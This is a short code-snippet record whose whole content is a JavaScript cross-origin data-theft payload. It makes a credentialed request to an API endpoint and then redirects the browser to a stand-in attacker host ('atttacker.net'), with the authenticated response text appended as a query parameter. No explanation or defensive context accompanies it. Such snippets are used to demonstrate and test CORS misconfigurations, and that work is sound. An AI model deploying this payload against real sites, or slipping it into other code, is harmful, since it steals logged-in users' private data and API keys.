---
id: 855fa0b3-c016-4246-866d-f2778e222657
type: code
language: js
verified: false
created_at: '2023-04-06T03:55:54.773810+00:00'
updated_at: '2023-04-06T03:55:54.779544+00:00'
---

# Code Snippet 855fa0b3

**Language**: js

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```
